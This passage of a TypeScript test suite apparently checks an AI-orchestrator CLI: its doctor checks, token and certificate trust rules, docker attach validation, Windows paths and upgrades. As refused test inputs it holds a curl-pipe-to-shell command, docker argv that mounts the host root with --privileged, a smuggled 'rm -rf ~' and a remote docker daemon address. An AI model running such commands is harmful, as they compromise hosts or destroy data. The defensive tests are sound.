  it("prints the setup checks", async () => {
    server.on("GET /api/v1/setup", { body: setupStatus });
    expect(await cli(["setup"])).toBe(0);
    expect(out).toMatch(/op\s+fail\s+op isn't installed\./);
  });

  const healthy = () => {
    server.on("GET /api/v1/health", { body: { version: "1.0.0-dev", uptimeS: 5 } });
    server.on("GET /api/v1/setup", {
      body: { ...setupStatus, checks: setupStatus.checks.filter((c) => c.id !== "op") },
    });
    server.on("GET /api/v1/image", { body: imageStatus });
    server.on("GET /api/v1/projects", { body: { projects: [projectSummary] } });
  };

  it("passes doctor on a healthy setup", async () => {
    healthy();
    expect(await cli(["doctor"])).toBe(0);
    expect(out).toMatch(/server\s+ok/);
    expect(out).toMatch(/token\s+ok\s+AIO_TOKEN/);
    expect(out).toMatch(new RegExp(`engine ${PROJECT_ID}\\s+ok`));
    expect(out).toMatch(/sudo\s+ok\s+sudo is off in containers\./);
  });

  it("fails doctor when the sudo password reference doesn't resolve", async () => {
    healthy();
    server.on("GET /api/v1/setup", {
      body: {
        ...setupStatus,
        checks: [
          ...setupStatus.checks.filter((c) => c.id !== "sudo"),
          {
            id: "sudo",
            status: "fail",
            message: "The sudo password reference op://SYNTHETIC/sudo/password doesn't resolve.",
            fixable: false,
          },
        ],
      },
    });
    expect(await cli(["doctor"])).toBe(1);
    expect(out).toMatch(/sudo\s+fail/);
  });

  it("fails doctor on a mismatched engine", async () => {
    healthy();
    server.on("GET /api/v1/projects", {
      body: {
        projects: [
          {
            ...projectSummary,
            container: {
              ...projectSummary.container,
              engine: { ...engine, versionMatches: false },
            },
          },
        ],
      },
    });
    expect(await cli(["doctor"])).toBe(1);
    expect(out).toContain("(mismatch)");
  });

  it("fails doctor without a token or with a refused one", async () => {
    healthy();
    expect(await cli(["doctor"], { AIO_TOKEN: undefined })).toBe(1);
    expect(out).toMatch(/token\s+fail\s+No token/);
    out = "";
    expect(await cli(["doctor"], { AIO_TOKEN: "wrong" })).toBe(1);
    expect(out).toMatch(/token\s+fail/);
  });

  it("fails doctor's server check on a refused server URL", async () => {
    const code = await cli(["doctor"], { AIO_SERVER: "http://203.0.113.5:21400" });
    expect(code).toBe(1);
    expect(out).toMatch(/server\s+fail\s+The CLI won't send its token over plain HTTP/);
    expect(err).toBe("");
    expect(server.requests).toEqual([]);
  });

  it("fails doctor when the server is down", async () => {
    expect(await cli(["doctor"], { AIO_SERVER: "https://127.0.0.1:1" })).toBe(1);
    expect(out).toMatch(/server\s+fail/);
  });
});

describe("events", () => {
  const event = {
    id: "e1",
    time: "2026-10-28T09:00:00.000Z",
    source: `engine:${CONTAINER}`,
    streamId: "srv-1",
    seq: 1,
    sourceSeq: 4,
    type: "ports.changed",
    container: CONTAINER,
    listeners: [],
  };

  it("prints frames as JSON lines and stops after --count events", async () => {
    server.events = [event, { ...event, id: "e2", seq: 2 }];
    expect(await cli(["events", "--types", "ports.changed", "--count", "2"])).toBe(0);
    const lines = out
      .trim()
      .split("\n")
      .map((l) => JSON.parse(l));
    expect(lines.map((l) => l.type)).toEqual(["hello", "ports.changed", "ports.changed"]);
    expect(server.lastEventsQuery).toEqual({ types: "ports.changed" });
  });

  it("prints a frame of a type it doesn't know, with a warning, and keeps going", async () => {
    server.events = [{ type: "nonsense", x: "\u009b" }, event];
    expect(await cli(["events", "--count", "2"])).toBe(0);
    const lines = out.trim().split("\n");
    expect(lines.map((l) => JSON.parse(l).type)).toEqual(["hello", "nonsense", "ports.changed"]);
    expect(lines[1]).toContain("\\u009b");
    expect(err).toContain('"nonsense" event doesn\'t match');
  });

  it("fails on a frame with no type", async () => {
    server.events = [{ nothing: true }];
    expect(await cli(["events", "--count", "1"])).toBe(1);
    expect(err).toContain("doesn't match the contract");
  });

  it("fails on a refused token", async () => {
    expect(await cli(["events"], { AIO_TOKEN: "wrong" })).toBe(1);
    expect(err).toContain("refused the token");
  });

  it("fails when the server closes the stream with an error code", async () => {
    server.closeEventsWith = { code: 1008, reason: "Unknown event types: bogus." };
    expect(await cli(["events", "--types", "bogus"])).toBe(1);
    expect(err).toContain("Unknown event types: bogus.");
  });

  it("ends cleanly when the server closes the stream normally", async () => {
    server.closeEventsWith = { code: 1000, reason: "" };
    expect(await cli(["events"])).toBe(0);
  });
});

describe("help", () => {
  it("prints help and exits 0", async () => {
    expect(await cli(["--help"])).toBe(0);
    expect(out).toContain("Usage: aio");
    out = "";
    expect(await cli(["review", "--help"])).toBe(0);
    expect(out).toContain("findings");
  });

  it("exits 2 on an unknown command", async () => {
    expect(await cli(["frobnicate"])).toBe(2);
  });
});

describe("trust in the server", () => {
  it("refuses to send the token over plain HTTP to another host", async () => {
    const code = await cli(["box", "list"], { AIO_SERVER: "http://203.0.113.5:21400" });
    expect(code).not.toBe(0);
    expect(err).toMatch(/won't send its token over plain HTTP to 203\.0\.113\.5:21400/);
    expect(server.requests).toHaveLength(0);
  });

  it("allows plain HTTP only with --insecure, and https anywhere", async () => {
    const { checkServerUrl } = await import("../src/settings.js");
    expect(checkServerUrl("http://203.0.113.5:21400", true)).toBeNull();
    expect(checkServerUrl("https://aio.example.com", false)).toBeNull();
    expect(checkServerUrl("http://localhost:21400", false)).toMatch(/use https:\/\/localhost/);
    expect(checkServerUrl("http://[::1]:21400", false)).toMatch(/serves HTTPS/);
    expect(checkServerUrl("http://127.0.0.1:21400", true)).toBeNull();
    expect(checkServerUrl("ftp://127.0.0.1", false)).toMatch(/http or https/);
  });

  it("refuses plain HTTP without a token, without mentioning one", async () => {
    const code = await cli(["box", "list"], {
      AIO_SERVER: "http://203.0.113.5:21400",
      AIO_TOKEN: undefined,
    });
    expect(code).toBe(2);
    expect(err).toMatch(/won't trust answers over plain HTTP from 203\.0\.113\.5:21400/);
    expect(err).not.toMatch(/token/);
  });

  it("keeps the server URL's credentials out of its messages", async () => {
    expect(await cli(["box", "list"], { AIO_SERVER: "https://user:hunter2@[bad" })).toBe(2);
    expect(err).toMatch(/isn't a valid URL/);
    expect(err).not.toContain("hunter2");
    err = "";
    expect(await cli(["box", "list"], { AIO_SERVER: "https://user:hunter2@127.0.0.1:1" })).toBe(1);
    expect(err).toMatch(/Can't reach the AI Orchestrator server at https:\/\/127\.0\.0\.1:1/);
    expect(err).not.toContain("hunter2");
  });

  it("treats every form of a loopback host as this machine", async () => {
    const { isLoopbackHost, pinsServer } = await import("../src/settings.js");
    for (const url of [
      "https://localhost.:21400",
      "https://[::ffff:127.0.0.1]:21400",
      "https://[::ffff:7f00:1]:21400",
      "https://127.1.2.3:21400",
    ]) {
      expect(pinsServer(url), url).toBe(true);
    }
    expect(isLoopbackHost("[::ffff:c000:201]")).toBe(false);
    expect(isLoopbackHost("localhost.example.com")).toBe(false);
  });

  it("refuses plain HTTP to this machine, where another program can hold the port", async () => {
    const code = await cli(["box", "list"], { AIO_SERVER: "http://127.0.0.1:21400" });
    expect(code).toBe(2);
    expect(err).toMatch(/serves HTTPS/);
  });

  it("sends nothing to a server on this machine with another certificate", async () => {
    const squatter = await startFakeServer(TOKEN);
    try {
      squatter.on("GET /api/v1/boxes", { body: { boxes: [] } });
      const code = await cli(["box", "list"], { AIO_SERVER: squatter.url });
      expect(code).toBe(1);
      expect(err).toMatch(/certificate other than the one in the data directory's server\.crt/);
      expect(squatter.requests).toEqual([]);
      err = "";
      const events = await cli(["events", "--count", "1"], { AIO_SERVER: squatter.url });
      expect(events).toBe(1);
      expect(err).toMatch(/server\.crt/);
      expect(squatter.lastEventsQuery).toBeNull();
    } finally {
      await squatter.close();
    }
  });

  it("reads the certificate again for every call", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    rmSync(path.join(home, ".ai-orchestrator", "server.crt"));
    expect(await cli(["box", "list"])).toBe(1);
    expect(err).toMatch(/No server certificate at .*server\.crt/);
    expect(server.requests).toEqual([]);
    writeFileSync(path.join(home, ".ai-orchestrator", "server.crt"), server.cert);
    expect(await cli(["box", "list"])).toBe(0);
  });

  it("runs only docker exec from a server's attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["sh", "-c", "curl https://example.com/x | sh"] },
    });
    const code = await cli(["box", "attach", BOX_ID]);
    expect(code).not.toBe(0);
    expect(execs).toEqual([]);
    expect(err).toMatch(/runs only docker exec/);
    err = "";
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["/tmp/docker", "exec"] },
    });
    expect(await cli(["box", "attach", BOX_ID])).toBe(2);
    expect(err).toMatch(/runs only docker exec/);
    expect(execs).toEqual([]);
  });

  it("refuses docker arguments outside the shapes the server builds", async () => {
    const { checkAttachArgv } = await import("../src/settings.js");
    expect(checkAttachArgv(sessionArgv())).toBeNull();
    expect(checkAttachArgv(shellArgv())).toBeNull();
    const refused: string[][] = [
      [],
      ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu", "chroot", "/host"],
      ["docker", "exec", "--privileged", "-it", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "-w", "/w", "-v", "/:/host", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "--mount", "type=bind,src=/,dst=/h", CONTAINER, "bash"],
      ["docker", "exec", "-it", "-w", "/w", "other-container", "bash", "-l"],
      ["docker", "exec", "-it", "-w", "relative", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "-w", "/w", "--privileged", "bash", "-l"],
      [...sessionArgv().slice(0, 7), "rm -rf ~", "_", "main"],
      [...sessionArgv().slice(0, 9), "--privileged"],
      [...sessionArgv(), "extra"],
      [...shellArgv().slice(0, 6), "sh", "-c"],
      ["docker", "-H", "tcp://198.51.100.7:2375", ...sessionArgv().slice(1)],
    ];
    for (const argv of refused) expect(checkAttachArgv(argv), argv.join(" ")).not.toBeNull();
    expect(checkAttachArgv([])).toMatch(/empty/);
  });

  it("escapes C1 controls in a refused attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["docker\u009b2J", "exec"] },
    });
    expect(await cli(["box", "attach", BOX_ID])).toBe(2);
    expect(err).toContain("\\x9b2J");
    expect(err).not.toContain("\u009b");
    expect(execs).toEqual([]);
  });

  it("keeps its copy of the attach script equal to the server's", async () => {
    const { ATTACH_SCRIPT } = await import("../src/settings.js");
    const { readFile } = await import("node:fs/promises");
    const source = await readFile(
      new URL("../../server/src/terminals/attach.ts", import.meta.url),
      "utf8",
    );
    const match = /EXTERNAL_ATTACH_SCRIPT =\s*'([^']*)'/.exec(source);
    expect(match?.[1]).toBe(ATTACH_SCRIPT);
  });

  it("fails cleanly on an event frame that isn't JSON", async () => {
    const { tailEvents } = await import("../src/events.js");
    const { EventEmitter } = await import("node:events");
    class FakeSocket extends EventEmitter {
      readonly OPEN = 1;
      readonly CONNECTING = 0;
      readyState = 1;
      constructor() {
        super();
        setTimeout(() => this.emit("message", Buffer.from("not json")), 1);
      }
      send() {}
      close() {
        this.readyState = 3;
      }
    }
    await expect(
      tailEvents({
        baseUrl: "http://127.0.0.1:1",
        token: "t",
        write: () => undefined,
        WebSocket: FakeSocket as never,
      }),
    ).rejects.toThrow(/isn't JSON/);
  });
});

describe("child environment", () => {
  it("drops the server token and keeps everything else", () => {
    const env = childEnv({ PATH: "/usr/bin", AIO_TOKEN: "t", AIO_SERVER_TOKEN: "s" });
    expect(env).toEqual({ PATH: "/usr/bin" });
  });
});

describe("Windows paths", () => {
  const WIN_CWD = "C:\\Users\\tester\\src\\app";
  const winCli = (args: string[]) =>
    runCli(args, {
      cwd: WIN_CWD,
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      home,
      out: (t) => (out += t),
      err: (t) => (err += t),
      pollMs: 5,
      hostOs: "win32",
    });

  it("sends a review the container path of a host repository", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    expect(await winCli(["review", "start", "--project", PROJECT_ID, "--repo", "."])).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/Users/tester/src/app" });
    expect(
      await winCli(["review", "start", "--project", PROJECT_ID, "--repo", "/mnt/host/c/x"]),
    ).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/x" });
  });

  it("prefers the box view's container working directory", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, {
      body: { ...boxView(), containerWorkDir: "/mnt/host/c/Users/tester/src/app" },
    });
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    expect(await winCli(["review", "start", "--box", BOX_ID])).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/Users/tester/src/app" });
  });

  it("maps a mount's default container path and keeps the drive colon", async () => {
    server.on(`PATCH /api/v1/projects/${PROJECT_ID}`, {
      body: { project, staleBoxes: [] },
    });
    await winCli([
      "project",
      "set",
      PROJECT_ID,
      "--mount",
      "data",
      "--mount",
      "D:\\cache:/cache",
      "--mount",
      "E:\\ref",
    ]);
    expect(last()?.body).toEqual({
      mounts: [
        {
          host: "C:\\Users\\tester\\src\\app\\data",
          container: "/mnt/host/c/Users/tester/src/app/data",
        },
        { host: "D:\\cache", container: "/cache" },
        { host: "E:\\ref", container: "/mnt/host/e/ref" },
      ],
    });
  });

  it("refuses a UNC repository", async () => {
    expect(
      await winCli(["review", "start", "--project", PROJECT_ID, "--repo", "\\\\server\\share"]),
    ).toBe(2);
    expect(err).toMatch(/UNC/);
  });
});

describe("--role", () => {
  it("refuses a vendor list with an empty entry", async () => {
    await expect(
      cli(["review", "start", "--box", "b", "--role", "reviewer=codex,"]),
    ).resolves.not.toBe(0);
  });
});

describe("package upgrade command", () => {
  it("records open work using an older server before restarting", async () => {
    writeFileSync(
      path.join(home, ".ai-orchestrator", "upgrade-open-work.json"),
      JSON.stringify({ boxes: [{ id: "stale", name: "stale" }], runs: [] }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [{ ...boxView(), status: "running" }] } });
    server.on("GET /api/v1/runs", { body: { runs: [] } });
    expect(await cli(["upgrade", "prepare"])).toBe(0);
    const work = JSON.parse(
      readFileSync(path.join(home, ".ai-orchestrator", "upgrade-open-work.json"), "utf8"),
    );
    expect(work.boxes.map((b: { id: string }) => b.id)).toEqual([BOX_ID]);
    expect(out).toContain("Recorded 1 boxes");
  });
  it.each(["prepared", "recovery"])(
    "preserves a %s record when the server is stopped",
    async (phase) => {
      const record = path.join(home, ".ai-orchestrator", "upgrade-open-work.json");
      const work = {
        phase,
        boxes: [{ id: "box", name: "Box" }],
        runs: [{ run_id: "run", name: "Run", projectId: "project" }],
      };
      writeFileSync(record, JSON.stringify(work));
      expect(await cli(["upgrade", "prepare"], { AIO_SERVER: "https://127.0.0.1:1" })).toBe(0);
      expect(JSON.parse(readFileSync(record, "utf8"))).toEqual(work);
    },
  );
  it("prints fallback and per-box failure reasons and exits nonzero", async () => {
    server.on("GET /api/v1/health", { body: { version: "1.0.0", uptimeS: 1 } });
    server.on("POST /api/v1/upgrade", {
      body: {
        image: "pinned",
        fallback: true,
        error: null,
        boxes: [{ id: BOX_ID, name: "Work", restored: false, reason: "Sign in required" }],
        runs: [],
      },
    });
    expect(await cli(["upgrade", "--timeout", "1"])).toBe(1);
    expect(out).toContain("fallback used");
    expect(out).toContain("Sign in required");
  });
  it("names work that no longer exists without failing the upgrade", async () => {
    server.on("GET /api/v1/health", { body: { version: "1.0.0", uptimeS: 1 } });
    server.on("POST /api/v1/upgrade", {
      body: {
        image: "latest",
        fallback: false,
        error: null,
        boxes: [
          {
            id: BOX_ID,
            name: "Work",
            restored: false,
            reason: "The box no longer exists.",
            gone: true,
          },
        ],
        runs: [],
      },
    });
    expect(await cli(["upgrade", "--timeout", "1"])).toBe(0);
    expect(out).toContain("The box no longer exists.");
  });
});

it("aborts the upgrade request at the CLI time limit", async () => {
  let aborted = false;
  const fetcher: typeof fetch = async (url, options) => {
    if (String(url).endsWith("/health"))
      return new Response(JSON.stringify({ version: "1.0.0", uptimeS: 1 }));
    return new Promise<Response>((_, reject) => {
      options?.signal?.addEventListener(
        "abort",
        () => {
          aborted = true;
          reject(new Error("aborted"));
        },
        { once: true },
      );
    });
  };
  expect(
    await runCli(["upgrade", "--timeout", "0.02"], {
      home,
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      fetch: fetcher,
      out: (t) => {
        out += t;
      },
      err: (t) => {
        err += t;
      },
    }),
  ).toBe(1);
  expect(aborted).toBe(true);
  expect(err).toContain("time limit reached");
});

it("bounds prepare requests by the CLI deadline", async () => {
  let aborted = false;
  const fetcher: typeof fetch = async (_url, options) =>
    new Promise<Response>((_, reject) => {
      const timer = setTimeout(() => reject(new Error("stand-in request failed")), 100);
      options?.signal?.addEventListener(
        "abort",
        () => {
          clearTimeout(timer);
          aborted = true;
          reject(new Error("aborted"));
        },
        { once: true },
      );
    });
  expect(
    await runCli(["upgrade", "prepare", "--timeout", "0.02"], {
      home,
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      fetch: fetcher,
      out: (t) => {
        out += t;
      },
      err: (t) => {
        err += t;
      },
    }),
  ).toBe(1);
  expect(aborted).toBe(true);
  expect(err).toContain("time limit reached");
});

it("names unconfirmed boxes and runs when server readiness times out", async () => {
  writeFileSync(
    path.join(home, ".ai-orchestrator", "upgrade-open-work.json"),
    JSON.stringify({
      boxes: [{ id: BOX_ID, name: "Active box" }],
      runs: [{ run_id: RUN, name: "Review in progress" }],
    }),
  );
  let aborted = false;
  const fetcher: typeof fetch = async (_url, options) =>
    new Promise<Response>((_, reject) => {
      options?.signal?.addEventListener(
        "abort",
        () => {
          aborted = true;
          reject(new Error("aborted"));
        },
        { once: true },
      );
    });
  expect(
    await runCli(["upgrade", "--timeout", "0.02"], {
      home,
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      fetch: fetcher,
      out: (t) => {
        out += t;
      },
      err: (t) => {
        err += t;
      },
    }),
  ).toBe(1);
  expect(aborted).toBe(true);
  expect(out).toContain("Active box");
  expect(out).toContain("Review in progress");
  expect(out).toContain("restoration unconfirmed");
});

describe("host vendor commands", () => {
  it.each([
    ["claude", "CLAUDE_CONFIG_DIR"],
    ["codex", "CODEX_HOME"],
    ["copilot", "COPILOT_HOME"],
  ])(
    "prepares %s's default account, passes vendor arguments and returns its exit code",
    async (vendor, variable) => {
      server.on("POST /api/v1/accounts/prepare", {
        status: 200,
        body: { dir: "/accounts/personal", problems: ["Missing include: optional.md"] },
      });
      let launched: { argv: string[]; env: NodeJS.ProcessEnv | undefined } | undefined;
      const code = await runCli(
        [vendor, "--", "--model", "literal spaced value", "--account", "vendor-option"],
        {
          env: {
            AIO_SERVER: server.url,
            AIO_TOKEN: TOKEN,
            AIO_SERVER_TOKEN: "other-token",
            PATH: "/usr/bin",
            KEEP: "yes",
          },
          home,
          out: (t) => (out += t),
          err: (t) => (err += t),
          exec: async (argv, options) => {
            launched = { argv, env: options?.env };
            return 17;
          },
        },
      );
      expect(code).toBe(17);
      expect(last()?.body).toEqual({ vendor });
      expect(launched?.argv).toEqual([
        vendor,
        "--model",
        "literal spaced value",
        "--account",
        "vendor-option",
      ]);
      expect(launched?.env).toMatchObject({ [variable]: "/accounts/personal", KEEP: "yes" });
      expect(launched?.env).not.toHaveProperty("AIO_TOKEN");
      expect(launched?.env).not.toHaveProperty("AIO_SERVER_TOKEN");
      expect(err).toContain("Missing include: optional.md");
    },
  );
  it("sends the explicitly named account and reports unknown accounts without launching", async () => {
    server.on("POST /api/v1/accounts/prepare", {
      status: 404,
      body: { error: { code: "not_found", message: "No Claude account missing" } },
    });
    expect(await cli(["claude", "--account", "missing"])).toBe(1);
    expect(last()?.body).toEqual({ vendor: "claude", name: "missing" });
    expect(err).toContain("No Claude account missing");
    expect(execs).toEqual([]);
  });
  it("rejects remote-machine selection before resolving or launching a local vendor CLI", async () => {
    expect(await cli(["--machine", "remote", "claude"])).toBe(2);
    expect(err).toContain("works on this machine only");
    expect(server.requests).toHaveLength(0);
    expect(execs).toEqual([]);
  });
  it("reports an unreachable server without launching", async () => {
    await server.close();
    expect(await cli(["codex"])).toBe(1);
    expect(err).toMatch(/server.*(reach|connect)|unreachable/i);
    expect(execs).toEqual([]);
  });
});
